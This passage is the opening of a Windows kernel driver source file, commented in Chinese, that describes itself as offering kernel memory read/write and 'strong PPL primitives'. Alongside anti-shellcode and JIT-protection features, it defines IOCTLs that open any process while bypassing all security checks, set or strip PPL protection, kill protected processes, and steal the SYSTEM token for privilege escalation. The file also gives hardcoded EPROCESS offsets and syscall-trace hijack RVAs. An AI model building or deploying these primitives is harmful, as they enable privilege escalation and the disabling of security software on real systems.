// Architect: tzdwindows 7
// tzd_ppl_drv: WDM 内核驱动 — 提供内核虚拟地址 R/W + 强力 PPL 原语
//
// ═══════════════════════════════════════════════════════════════════════
// IOCTL 总览
// ═══════════════════════════════════════════════════════════════════════
//   0x80002000  IOCTL_TZD_READ_KMEM     读内核虚拟内存 (原有)
//   0x80002004  IOCTL_TZD_WRITE_KMEM    写内核虚拟内存 (原有)
//   0x80002008  IOCTL_TZD_OPEN_PROCESS  内核强制打开进程句柄 (绕过所有安全检查)
//   0x8000200C  IOCTL_TZD_SET_PPL       按 PID 直接设置 PPL 保护字节
//   0x80002010  IOCTL_TZD_QUERY_PPL     按 PID 查询 PPL 保护字节
//   0x80002014  IOCTL_TZD_KILL_PROCESS  内核终止任意进程 (即便 PPL 保护)
//   0x80002018  IOCTL_TZD_STEAL_TOKEN   窃取源进程 Token 注入目标 (提权到 SYSTEM)
//
//   ─── 反 Shellcode 防御 (针对指定 Java 进程: 允许 JIT / 严格阻断 shellcode) ───
//   0x8000202C  IOCTL_TZD_ARM_SC_DEFENSE   武装: 注册线程/镜像通知 + 周期 NX 扫描线程
//   0x80002030  IOCTL_TZD_DISARM_SC_DEFENSE 解除武装 (清 PID; 线程/通知常驻以便重武装)
//   0x80002034  IOCTL_TZD_QUERY_SC_STATS    查询累计统计 (扫描数/NX 页数/新线程/无签名镜像/无文件PE)
//   ─── ETW-TI 主方案 (PPL 式内核写: 强制 ThreatInt provider 发射; 失败回退周期扫描) ───
//   0x80002038  IOCTL_TZD_ARM_ETW_TI        强制启用 ETW Threat-Intelligence 发射
//   0x8000203C  IOCTL_TZD_DISARM_ETW_TI     关闭 (置 enable count=0)
//   ─── JIT 代码缓存写保护 (EPT-based: 区分 JIT 合法写 vs 恶意篡改) ───
//   0x80002054  IOCTL_TZD_REGISTER_JIT_RANGE 注册 JIT GVA 范围 + 附着进程限制物理页 R-X
//   0x80002058  IOCTL_TZD_SET_JVM_WRITER    设置 JVM 原生写者范围 (合法写者 RIP 范围)
//   0x8000205C  IOCTL_TZD_QUERY_JIT_ALERT     查询 JIT 篡改告警 (tampered/blocks/allows)
//   0x80002060  IOCTL_TZD_CLEAR_JIT_RANGES    清除所有 JIT 范围 + 恢复 EPT 为 RWX
//
// ═══════════════════════════════════════════════════════════════════════
// 安全设计 (绝不 BSOD)
// ═══════════════════════════════════════════════════════════════════════
//   - 所有内存操作用 __try/__except 包裹, 非法地址返回错误而非 #PF → BSOD
//   - g_Unloading 原子标志: unload 期间拒绝新 IRP
//   - unload 顺序: IoDeleteSymbolicLink → IoDeleteDevice (先断符号链接)
//   - 不调用 RtlFreeUnicodeString(g_SymLink 是静态字面量, 不是 pool 内存)
//
// ═══════════════════════════════════════════════════════════════════════
// 构建: build_tzd_drv.bat (cl /kernel + link ntoskrnl.lib, WDK 10.0.28000.0)
// 签名: 需 test-signing 或 kernel-debug 模式
// ═══════════════════════════════════════════════════════════════════════
#include <ntddk.h>

// Thin hypervisor (VMX + EPT) for JIT code cache protection
#include "hypervisor.c"

// ─── ntddk.h 中未声明的内核函数 (通常在 ntifs.h, 我们只包含 ntddk.h) ───
// ZwTerminateProcess — ntddk.h 已声明, 不需重复 (C4273 警告)
// PsLookupProcessByProcessId — ntifs.h 中声明, 这里显式声明
extern NTSTATUS NTAPI PsLookupProcessByProcessId(HANDLE ProcessId, PEPROCESS *Process);
// ObOpenObjectByPointer — wdm.h 中声明但部分 WDK 版本不暴露, 这里显式声明
extern NTSTATUS NTAPI ObOpenObjectByPointer(
    PVOID Object,
    ULONG HandleAttributes,
    PACCESS_STATE PassedAccessState,
    ACCESS_MASK DesiredAccess,
    POBJECT_TYPE ObjectType,
    KPROCESSOR_MODE AccessMode,
    PHANDLE Handle);
// PsThreadType — 线程对象类型 (ntddk.h 已声明为 POBJECT_TYPE*, 用 *PsThreadType 取 POBJECT_TYPE)
// ZwTerminateThread — 强制终止线程 (ntoskrnl.lib 未导出, 用 MmGetSystemRoutineAddress 动态解析)
typedef NTSTATUS (NTAPI *PFN_ZwTerminateThread)(HANDLE ThreadHandle, NTSTATUS ExitStatus);
static PFN_ZwTerminateThread g_ZwTerminateThread = NULL;

// MmCopyVirtualMemory — 跨进程读内存 (避免 KeStackAttachProcess/KAPC_STATE 头文件缺失)
extern NTSTATUS NTAPI MmCopyVirtualMemory(PEPROCESS SourceProcess, PVOID SourceAddress,
                                          PEPROCESS TargetProcess, PVOID TargetAddress,
                                          SIZE_T Size, KPROCESSOR_MODE PreviousMode,
                                          PSIZE_T ReturnSize);
// KAPC_STATE + KeStackAttachProcess / KeUnstackDetachProcess — ntddk.h 不暴露
// (JIT 物理页限制需附着目标进程走页表翻译 GVA→GPA)
// KAPC_STATE 在 x64 上为 ~0x28 字节; 用不透明联合体足够 (只存不取字段)
#pragma pack(push, 8)
typedef union _TZD_KAPC_STATE {
    ULONG64 _opaque[6]; // 足够覆盖 x64 KAPC_STATE (~0x28 字节)
} TZD_KAPC_STATE;
#pragma pack(pop)
typedef TZD_KAPC_STATE *PTZD_KAPC_STATE;
extern VOID NTAPI KeStackAttachProcess(PEPROCESS Process, PTZD_KAPC_STATE ApcState);
extern VOID NTAPI KeUnstackDetachProcess(PTZD_KAPC_STATE ApcState);
// MmGetPhysicalAddress — 已由 ntddk.h 声明, 不重复 extern
// PsGetProcessId / PsProcessType / ZwClose 已由 ntddk.h(→wdm.h) 声明, 不重复 extern (避免 C4273)
// tzd_systrace_resolve_base — 定义在下方 (tzd_init_offsets 调用, 需前向声明)
extern ULONG64 tzd_systrace_resolve_base(void);
#ifndef OB_OPERATION_HANDLE_OPEN
#define OB_OPERATION_HANDLE_OPEN 0x00000002
#endif

// MEMORY_BASIC_INFORMATION 是用户态结构, 内核头文件(ntddk.h)无;
// 按 Win10 1607+ 布局定义 (含 PartitionId), 与系统 ZwQueryVirtualMemory 输出一致
#pragma pack(push, 8)
typedef struct _TZD_MEMORY_BASIC_INFORMATION
{
    PVOID BaseAddress;
    PVOID AllocationBase;
    ULONG AllocationProtect;
    USHORT PartitionId;
    USHORT Reserved;
    SIZE_T RegionSize;
    ULONG State;
    ULONG Protect;
    ULONG Type;
} TZD_MEMORY_BASIC_INFORMATION;
#pragma pack(pop)
#ifndef MEM_COMMIT
#define MEM_COMMIT 0x1000
#endif
#ifndef PAGE_EXECUTE_READ
#define PAGE_EXECUTE_READ 0x20
#endif

// 内核模式下的进程访问权限 (用户态 winnt.h 不可用)
#ifndef PROCESS_TERMINATE
#define PROCESS_TERMINATE 0x0001
#endif
#ifndef PROCESS_ALL_ACCESS
#define PROCESS_ALL_ACCESS 0x001F0FFF
#endif

// PsGetProcessProtection 通过 MmGetSystemRoutineAddress 动态解析,
// 避免与 ntddk.h 的声明冲突 (不同 WDK 版本返回 PS_PROTECTION 结构体或 UCHAR)。
typedef UCHAR (*PsGetProcessProtection_t)(PEPROCESS);
static PsGetProcessProtection_t g_PsGetProcessProtection = NULL;

// ═══════════════════════════════════════════════════════════════════════
// ─── 常量定义 ────────────────────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

#define DEVICE_NAME L"\\Device\\TzdPpl"
#define SYMLINK_NAME L"\\DosDevices\\TzdPpl"

#define IOCTL_TZD_READ_KMEM CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_WRITE_KMEM CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_OPEN_PROCESS CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_SET_PPL CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_QUERY_PPL CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_KILL_PROCESS CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_STEAL_TOKEN CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_SET_MONITOR_PID CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_SCAN_SYSCALLS CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_PROTECT_PID CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_UNPROTECT_PID CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_ARM_SC_DEFENSE CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_DISARM_SC_DEFENSE CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_QUERY_SC_STATS CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_ARM_ETW_TI CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_DISARM_ETW_TI CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_QUERY_ALERT CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_ARM_SYSTRACE CTL_CODE(0x8000, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_DISARM_SYSTRACE CTL_CODE(0x8000, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_ARM_HYPERVISOR CTL_CODE(0x8000, 0x813, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_DISARM_HYPERVISOR CTL_CODE(0x8000, 0x814, METHOD_BUFFERED, FILE_ANY_ACCESS)
// ─── JIT 代码缓存写保护 (EPT-based: 区分 JIT 合法写 vs 恶意篡改) ───
#define IOCTL_TZD_REGISTER_JIT_RANGE CTL_CODE(0x8000, 0x815, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_SET_JVM_WRITER     CTL_CODE(0x8000, 0x816, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_QUERY_JIT_ALERT    CTL_CODE(0x8000, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_TZD_CLEAR_JIT_RANGES   CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)

// EPROCESS.Token 偏移 (Win11 23H2 build 22631)
// _EX_FAST_REF 类型: 8 字节, 低 4 位为引用计数
// 可用 -DEPROCESS_TOKEN_OFFSET=0xXXX 覆盖以适配其他版本
#ifndef EPROCESS_TOKEN_OFFSET
#define EPROCESS_TOKEN_OFFSET 0x4B8
#endif

// SE_SIGNING_LEVEL 常量 (用于 SET_PPL 时设置 SignatureLevel)
#define TZD_SE_SIGNING_LEVEL_WINDOWS_TCB 0x0E

// ═══════════════════════════════════════════════════════════════════════
// ─── IOCTL 输入/输出结构 ─────────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

#pragma pack(push, 1)

// READ/WRITE KMEM (原有, 向后兼容)
typedef struct _TZD_KMEM_OP
{
    ULONG64 Address;
    ULONG Size;
    // 后跟 Size 字节 Data (偏移 = sizeof(TZD_KMEM_OP) = 12)
} TZD_KMEM_OP, *PTZD_KMEM_OP;

// OPEN_PROCESS: 内核强制打开进程句柄
//   AccessMode = KernelMode → 绕过所有安全检查
//   HandleAttributes = 0 → 句柄在调用进程句柄表 (用户态可直接使用)
typedef struct _TZD_OPEN_PROCESS_REQ
{
    ULONG Pid;
    ACCESS_MASK DesiredAccess;
} TZD_OPEN_PROCESS_REQ, *PTZD_OPEN_PROCESS_REQ;

typedef struct _TZD_OPEN_PROCESS_RSP
{
    HANDLE Handle;
    NTSTATUS Status;
} TZD_OPEN_PROCESS_RSP, *PTZD_OPEN_PROCESS_RSP;

// SET_PPL: 按 PID 直接设置 PPL 保护
//   SigLevel = 0 → 不改 SignatureLevel / SectionSignatureLevel
//   SigLevel != 0 → 同时设置两者 (确保 PPL 真正生效)
typedef struct _TZD_SET_PPL_REQ
{
    ULONG Pid;
    UCHAR Protection; // PS_PROTECTION 字节
    UCHAR SigLevel;   // SE_SIGNING_LEVEL_* (0 = 不改)
    UCHAR Reserved[2];
} TZD_SET_PPL_REQ, *PTZD_SET_PPL_REQ;

// QUERY_PPL: 按 PID 查询保护字节
typedef struct _TZD_QUERY_PPL_REQ
{
    ULONG Pid;
} TZD_QUERY_PPL_REQ, *PTZD_QUERY_PPL_REQ;

typedef struct _TZD_QUERY_PPL_RSP
{
    UCHAR Protection;
} TZD_QUERY_PPL_RSP, *PTZD_QUERY_PPL_RSP;

// KILL_PROCESS: 内核终止任意进程
typedef struct _TZD_KILL_REQ
{
    ULONG Pid;
    NTSTATUS ExitStatus;
} TZD_KILL_REQ, *PTZD_KILL_REQ;

// STEAL_TOKEN: 窃取源进程 Token 注入目标进程
//   SourcePid = 0 → 默认 System (PID=4)
typedef struct _TZD_STEAL_TOKEN_REQ
{
    ULONG TargetPid;
    ULONG SourcePid;
} TZD_STEAL_TOKEN_REQ, *PTZD_STEAL_TOKEN_REQ;

// SET_MONITOR_PID: 设置要扫描直接 syscall 的目标进程
typedef struct _TZD_SET_MONITOR_PID_REQ
{
    ULONG Pid;
} TZD_SET_MONITOR_PID_REQ, *PTZD_SET_MONITOR_PID_REQ;

// SCAN_SYSCALLS: 扫描结果 (命中数 + 已 NX 阻断数)
typedef struct _TZD_SCAN_RESULT
{
    ULONG Hits;      // 发现的 syscall(0F05) gadget 数
    ULONG NxBlocked; // 已改 NX 阻断的页数
    ULONG Reserved[2];
} TZD_SCAN_RESULT, *PTZD_SCAN_RESULT;

// PROTECT_PID: 事件驱动保护 (ObRegisterCallbacks) — 裁剪他人对被保护进程的危险句柄权限
typedef struct _TZD_PROTECT_PID_REQ
{
    ULONG Pid;
} TZD_PROTECT_PID_REQ, *PTZD_PROTECT_PID_REQ;

// ARM_SC_DEFENSE: 武装反 Shellcode 防御到指定 PID (典型: java.exe)
typedef struct _TZD_SC_DEFENSE_REQ
{
    ULONG Pid;
} TZD_SC_DEFENSE_REQ, *PTZD_SC_DEFENSE_REQ;

// QUERY_SC_STATS: 累计统计 (各计数器为单调递增, 由 Interlocked 维护)
typedef struct _TZD_SC_RESULT
{
    ULONG Scans;        // 周期扫描次数
    ULONG PagesNx;      // 累计 NX 阻断页数 (shellcode/无文件PE)
    ULONG ThreadsSeen;  // 被武装进程检测到的新线程数
    ULONG ImagesSeen;   // 被武装进程检测到的镜像加载数
    ULONG UnsignedImgs; // 无签名镜像数 (签名校验告警)
    ULONG FilelessPe;   // 无文件 PE(MZ) 命中区段数
    ULONG Reserved[2];
} TZD_SC_RESULT, *PTZD_SC_RESULT;

// QUERY_ALERT: 扫描发现 shellcode → RunPPL 轮询本结构, 命中则在用户层 TerminateProcess(0x5C)
typedef struct _TZD_SC_ALERT
{
    ULONG Compromised;       // 1 = 已发现 shellcode (用户层应 kill 0x5C)
    ULONG ChildBlocked;      // 第2层阻断的可疑子进程数
    ULONG LastShellcodeType; // 最近命中: 1直接 2间接 3窗口 4无文件PE 5RWX
    ULONG CreatorThreadId;   // 最近阻断子进程的创建者 TID (溯源; 不可伪造: 当前线程指针)
    ULONG64 LastShellcodeVa; // 最近 shellcode 命中 VA
} TZD_SC_ALERT, *PTZD_SC_ALERT;

// ─── JIT 代码缓存写保护 (EPT-based) ───
// REGISTER_JIT_RANGE: 注册 JIT 代码缓存 GVA 范围 + 附着进程走页表限制物理页
//   流程: 存 GVA 范围 → KeStackAttachProcess(pid) → MmGetPhysicalAddress 逐页
//   → hypervisor_restrict_jit_physical(2MB 粒度) → KeUnstackDetachProcess
//   JDK20 代码缓存有 3 个堆, 可多次调用注册各自范围
typedef struct _TZD_JIT_RANGE_REQ
{
    ULONG Pid;        // 目标进程 PID (附着走页表用)
    ULONG Reserved;
    ULONG64 Base;     // JIT GVA 基址 (代码缓存堆起始)
    ULONG64 Size;     // JIT GVA 大小
} TZD_JIT_RANGE_REQ, *PTZD_JIT_RANGE_REQ;

// SET_JVM_WRITER: 设置 JVM 原生写者范围 (jvm.dll/java.exe 代码段)
//   合法 JIT 补丁的写者 RIP 必在此范围; 范围外的写者 → 恶意篡改
typedef struct _TZD_JVM_WRITER_REQ
{
    ULONG64 JvmBase; // jvm.dll/java.exe 代码段基址
    ULONG64 JvmSize; // jvm.dll/java.exe 代码段大小
} TZD_JVM_WRITER_REQ, *PTZD_JVM_WRITER_REQ;

// QUERY_JIT_ALERT: 查询 JIT 篡改状态 (用户层轮询 → 发现篡改则 kill 0x5C)
typedef struct _TZD_JIT_ALERT
{
    ULONG JitTampered;    // 1 = 检测到非 JVM 写 JIT (应 kill)
    ULONG JitBlocks;      // 累计阻止写次数
    ULONG JitAllows;      // 累计允许 JVM 写次数
    ULONG JitRangeCount;  // 已注册 JIT 范围数
    ULONG64 TamperRip;    // 最近被阻止写者的 RIP
    ULONG64 TamperVa;     // 最近被写的 JIT GVA
} TZD_JIT_ALERT, *PTZD_JIT_ALERT;

#pragma pack(pop)

// ═══════════════════════════════════════════════════════════════════════
// ─── 全局状态 ────────────────────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

static PDEVICE_OBJECT g_DeviceObj = NULL;
static UNICODE_STRING g_SymLink;
static volatile LONG g_Unloading = 0;       // 1 = 卸载中, 拒绝新 IRP
static ULONG g_ProtectionOffset = 0;        // EPROCESS.Protection 偏移 (动态解析)
static ULONG g_UniquePidOffset = 0;         // EPROCESS.UniqueProcessId 偏移 (动态解析)
static ULONG g_ExitStatusOffset = 0;        // EPROCESS.ExitStatus 偏移 (动态解析)
static ULONG g_ActiveLinksOffset = 0;       // EPROCESS.ActiveProcessLinks 偏移 (动态解析)
static PVOID g_PspActiveProcessLock = NULL; // PspActiveProcessLock 地址 (动态解析)
// ★ force-kill 用 (动态解析自 PsGetNextProcessThread / PsGetProcessExitProcessCalled)
static ULONG g_FlagsOffset = 0;            // EPROCESS.Flags (bit3=ProcessTerminating)
static ULONG g_ThreadListHeadOffset = 0;    // EPROCESS.ThreadListHead (LIST_ENTRY)
static ULONG g_ThreadListEntryOffset = 0;   // ETHREAD.ThreadListEntry (CONTAINING_RECORD 偏移)
static ULONG g_ProcessLockOffset = 0;       // EPROCESS.ProcessLock (EX_PUSH_LOCK)
// ★ kill 保护标志偏移 (从 PsIsProcessPrimaryTokenFrozen / PsIsProcessCommitRelinquished 解析)
static ULONG g_ProcessFlags2Offset = 0;     // EPROCESS+0x460 (bit10=跳过PspTerminateAllThreads)
static ULONG g_CommitRelinquishedOffset = 0; // EPROCESS+0x87C (bit0=跳过PspTerminateThreadByPointer)
static ULONG g_ThreadCrossFlagsOffset = 0;   // ETHREAD (bit10=跳过PspTerminateThreadByPointer)

// ─── 直接 syscall 扫描 (PG-safe: 扫描+NX, 不 hook syscall 派发器) ───
static HANDLE g_MonitorPid = 0; // 被监控目标进程 PID (0=未设)
// 豁免名单: 这些镜像内的 syscall 合法 (ntdll/win32u 有 syscall 桩; seckill_native.dll 用户豁免)
static const WCHAR *g_ExemptTails[] = {
    L"ntdll.dll", L"win32u.dll", L"seckill_native.dll",
    L"kernelbase.dll", L"kernel32.dll", L"ucrtbase.dll", L"win32ubase.dll"};
// NT 内存 API (运行时解析, 避免头文件冲突)
typedef NTSTATUS(NTAPI *PFN_ZwQueryVirtualMemory)(HANDLE, PVOID, ULONG, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI *PFN_ZwProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
static PFN_ZwQueryVirtualMemory g_ZwQueryVirtualMemory = NULL;
static PFN_ZwProtectVirtualMemory g_ZwProtectVirtualMemory = NULL;

// ─── 事件驱动进程保护 (ObRegisterCallbacks, 免疫 direct/indirect syscall, 无 TOCTOU, 不崩) ───
static volatile LONG g_ProtectedPid = 0; // 被保护进程 PID (0=未保护)
static PVOID g_ObRegHandle = NULL;       // ObRegisterCallbacks 返回的注册句柄

// ─── 反 Shellcode 防御 (针对指定 Java 进程: 允许 JIT / 严格阻断 shellcode) ───
// 仅用文档化内核 API; 不用 PsSetCreateThreadNotifyRoutineEx —— 其 per-thread info
// 结构(PS_CREATE_THREAD_NOTIFY_INFO)未在任何公共 WDK 头中声明(已核对 ntddk.h /
// ntifs.h 及 28000/26100 两版)。用未文档结构在 Windows 版本错位时会读写错位字段
// → BSOD, 违背"绝不 BSOD"原则。故用已声明的非 Ex 变体(检测)+ 周期 NX 中和(阻断)。
static volatile LONG g_ScArmedPid = 0;           // 被反 shellcode 保护的目标 PID (0=未武装)
static volatile LONG g_ScThreadsSeen = 0;        // 检测到的新线程数 (累计)
static volatile LONG g_ScImagesSeen = 0;         // 检测到的镜像加载数 (累计)
static volatile LONG g_ScUnsignedImgs = 0;       // 无签名镜像数 (累计)
static volatile LONG g_ScFilelessPe = 0;         // 无文件 PE(MZ) 命中区段数 (累计)
static volatile LONG g_ScPagesNx = 0;            // 累计 NX 阻断页数
static volatile LONG g_ScScans = 0;              // 周期扫描次数 (累计)
static volatile PVOID g_ScThreadObj = NULL;      // 扫描线程对象 (线程自引用; shutdown 等待退出后 ObDereference)
static BOOLEAN g_ScNotifiesRegistered = FALSE;   // 线程/镜像通知是否已注册
static BOOLEAN g_ScProcNotifyRegistered = FALSE; // 进程创建通知(第2层)是否已注册
static volatile LONG g_ScChildBlocked = 0;       // 被第2层阻断的可疑子进程数(累计)
static volatile LONG g_ScCompromised = 0;        // 扫描发现 shellcode → 置 1 (RunPPL 轮询后 kill 0x5C)
static volatile LONG g_ScLastShellcodeType = 0;  // 最近 shellcode 命中类型 (1直接/2间接/3窗口/4无文件PE/5RWX)
static volatile LONG64 g_ScLastShellcodeVa = 0;  // 最近 shellcode 命中 VA
static volatile LONG g_ScLastCreatorTid = 0;     // 最近阻断子进程的创建者 TID (溯源; 不可伪造: 当前线程指针)
static KEVENT g_ScStopEvent;                     // 通知扫描线程退出 (NotificationEvent)
static UCHAR g_ScPageBuf[0x1000];                // 跨进程读页缓冲 (仅扫描线程用, 单线程无并发)

// ntdll 可执行区范围 (扫描时从 VAD 捕获, 供间接 syscall 检测: 目标须在 ntdll 且为 0F 05)
static volatile ULONG64 g_NtdllBase = 0;
static volatile SIZE_T g_NtdllSize = 0;

// ─── JIT 代码缓存完整性校验 (捕获 Unsafe.putByte 从 jvm.dll 发起的篡改) ──────
//   EPT 层只能检查写者 RIP: Unsafe.putByte 的原生实现(Unsafe.c)在 jvm.dll 内
//   → RIP 通过检查 → 写被允许 → 需要内容校验层补充
//   机制: 逐页存 XOR 校验和; 扫描时比对 → 变更则用 tzd_is_jit_code 验证内容
//   - 变更 + 有 shellcode 标记 → 篡改 → compromised
//   - 变更 + 仍有 JIT 标记 → 合法 JIT 补丁 (set_int_at 等) → 更新校验和
//   - 变更 + 无 JIT 标记 + 无 shellcode 标记 → 可疑 → compromised (保守)
#define MAX_JIT_CKSUM_RANGES 8
static ULONG *g_JitCksums[MAX_JIT_CKSUM_RANGES] = {0};  // 逐页 XOR 校验和数组
static SIZE_T g_JitCksumPages[MAX_JIT_CKSUM_RANGES] = {0}; // 每范围的页数

// ─── ETW-TI 主方案 (PPL 式内核写: 强制 ThreatInt provider 发射) ───────────────
// 逆向 EtwProviderEnabled / KeInsertQueueApc 确认: EtwThreatIntProvRegHandle 是指向
// _ETW_REG_ENTRY 的指针; reg-entry→[+0x20]=GuidEntry(→_ETW_GUID_ENTRY); GuidEntry 的
// [+0x60 count]/[+0x64 level]/[+0x68 flags]/[+0x70 kwmask1]/[+0x78 kwmask2] 即启用态。
// KeInsertQueueApc 以 `mov r10,[rip+disp]`(4C 8B 15) 取该全局 → 扫 (48|4C) 8B + RIP 相对。
// 定位后用 ThreatIntProviderGuid 原始 16 字节在 GuidEntry 内匹配确认 (不依赖"默认禁用",
// 故 ThreatInt 已被 Defender 等启用(count≠0)时也能命中并拓宽到全关键字)。仅数据写, 全程 __try。
#define ETWTI_REGENTRY_GUIDENTRY_OFS 0x20 // _ETW_REG_ENTRY -> GuidEntry 指针 (→_ETW_GUID_ENTRY)
#define ETWTI_GE_COUNT_OFS 0x60           // ULONG : 已启用会话数(0=禁用)
#define ETWTI_GE_LEVEL_OFS 0x64           // UCHAR : 已启用级别
#define ETWTI_GE_FLAGS_OFS 0x68           // ULONG : bit0x40 = 关键字0即启用
#define ETWTI_GE_KWMASK1_OFS 0x70         // ULONG64: 关键字掩码1
#define ETWTI_GE_KWMASK2_OFS 0x78         // ULONG64: 关键字掩码2
// ThreatIntProviderGuid 原始存储字节 (IDA @ 0x14000EAF0), 用于 GuidEntry 内匹配确认
static const UCHAR g_ThreatIntGuid[16] = {
    0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56, 0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44};
static PVOID g_EtwThreatIntRegHandleAddr = NULL;  // 解析到的 EtwThreatIntProvRegHandle 全局地址
static PVOID g_EtwTiGuidEntry = NULL;             // reg-entry→[+0x20] GuidEntry (供 disarm)
static volatile LONG g_EtwTiEnabled = 0;          // 1 = ETW-TI 已强制启用
static PVOID g_KeSetSystemServiceCallback = NULL; // 探测: per-syscall trace 注册 API (非导出则 NULL=环境不允许)

// ─── 系统调用追踪劫持 (KiTrackSystemCallEntry 路径; PG-safe 数据写, 非 KeSetSystemServiceCallback) ──
// RVA 来自 IDA .i64 (该 ntoskrnl 构建特定); 运行时通过 LSTAR MSR 推算 ntoskrnl 基址, 经 MZ 校验。
#define SYSTRACE_KISYSCALL64_RVA 0x433300      // KiSystemCall64 (LSTAR 目标; 推算 base 用)
#define SYSTRACE_CALLLOUTS_RVA 0xD1F260        // KiDynamicTraceCallouts
#define SYSTRACE_ENTRY_DISPATCHER_RVA 0xD1F270 // qword_140D1F270 (entry dispatcher)
#define SYSTRACE_TRACEMASK_RVA 0xD1EC80        // KiDynamicTraceMask
#define SYSTRACE_TRACEENABLED_RVA 0xD1EBA4     // KiDynamicTraceEnabled
#define SYSTRACE_CALLBACKTABLE_RVA 0xD54DD0    // KiSystemServiceTraceCallbackTable (lazy-built)
#define SYSTRACE_NENTRIES 486                  // 0x1E6 条目
#define SYSTRACE_ENTRY_STRIDE 0x40             // 每条目 0x40 字节
#define SYSTRACE_ENTRY_FIRST 0x10              // 首条目在 table+0x10
#define SYSTRACE_ACTIVE_OFS 0x28               // 条目+0x28: active 标志 (byte, 1=激活)

static volatile ULONG64 g_SysTraceBase = 0; // ntoskrnl 基址 (backward-scan)
static PUCHAR g_SysTraceMaskAddr = NULL;    // 动态找到的 KiDynamicTraceMask 地址
static ULONG g_SysTraceMaskOrig = 0;        // 原 mask 值 (恢复用)
static BOOLEAN g_SysTraceActive = FALSE;    // systrace 已激活

// ═══════════════════════════════════════════════════════════════════════
// ─── 动态偏移解析 ──────────────────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

// 从 PsGetProcessProtection 机器码提取 Protection 偏移 (跨版本健壮解析):
//   8A 81 <off32> C3        → mov al,  [rcx+disp32]; ret   (Win10/11 常见)
//   0F B6 81 <off32> C3     → movzx eax,[rcx+disp32]; ret
//   [REX] 8A 81 <off32> C3  → 带 REX 前缀的变体
// 通用扫描: 在前 16 字节里找 "81 <disp32> C3", 前面是 8A 或 0F B6 → 提取 disp32
// 不硬编码偏移; 并做 sanity 范围校验 (Protection 偏移通常在 0x100..0x2000),
// 越界则拒绝 (返回 0 → SET_PPL 返回 INVALID_PARAMETER, 不写错位)
// (PsGetVersion 已由 wdm.h 声明, 无需重复 extern)
static void tzd_init_offsets(void)
{
    // 动态解析 PsGetProcessProtection (避免 WDK 版本声明冲突)
    UNICODE_STRING name;
    RtlInitUnicodeString(&name, L"PsGetProcessProtection");
    g_PsGetProcessProtection = (PsGetProcessProtection_t)MmGetSystemRoutineAddress(&name);
    if (!g_PsGetProcessProtection)
    {
        DbgPrint("[tzd] PsGetProcessProtection not found\n");
        return;
    }

    PUCHAR fn = (PUCHAR)g_PsGetProcessProtection;
    ULONG off = 0;
    __try
    {
        // 快速匹配两种标准编码
        if (fn[0] == 0x8A && fn[1] == 0x81 && fn[6] == 0xC3)
        {
            off = *(ULONG *)(fn + 2);
        }
        else if (fn[0] == 0x0F && fn[1] == 0xB6 && fn[2] == 0x81 && fn[7] == 0xC3)
        {
            off = *(ULONG *)(fn + 3);
        }
        else
        {
            // 通用扫描: 找 "81 <disp32> C3", 前导 8A 或 0F B6 (容忍 REX 前缀位移)
            for (int i = 1; i < 16 && off == 0; i++)
            {
                if (fn[i] != 0x81)
                    continue;
                if (fn[i + 5] != 0xC3)
                    continue; // 后面必须是 ret
                if (fn[i - 1] == 0x8A)
                { // mov al, [rcx+disp32]
                    off = *(ULONG *)(fn + i + 1);
                }
                else if (i >= 2 && fn[i - 2] == 0x0F && fn[i - 1] == 0xB6)
                {
                    off = *(ULONG *)(fn + i + 1); // movzx eax, [rcx+disp32]
                }
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        off = 0;
    }

    // sanity: EPROCESS.Protection 偏移应在合理区间, 否则视为解析失败 (不写错位)
    if (off >= 0x100 && off < 0x2000)
    {
        g_ProtectionOffset = off;
        DbgPrint("[tzd] Protection offset = 0x%X (动态解析成功)\n", off);
    }
    else
    {
